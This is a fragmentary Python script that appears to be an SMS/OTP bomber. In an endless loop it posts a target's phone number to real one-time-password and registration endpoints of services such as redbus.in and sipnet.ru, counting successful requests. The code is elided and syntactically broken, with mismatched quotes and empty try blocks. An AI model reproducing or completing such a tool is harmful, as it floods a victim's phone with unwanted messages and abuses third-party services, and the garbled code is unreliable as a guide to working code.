...
while True:
	...
	try:        
                ...
                failed += 1
	try:
		requests.post('https://www.redbus.in/Personalization/SendOTP?mobile="+str(_phone)+"&phoneCode=91&OTPSource=SIGNIN')
		print(random.choice(colors))		
		print("Successful Requests   : ", success)
	except:
	...
	try:        
                ...
                failed += 1
	try:
		requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',data = {"phone":_phone,"oper":"90"})
		print(random.choice(colors))		
		print("Successful Requests   : ", success)
	except:
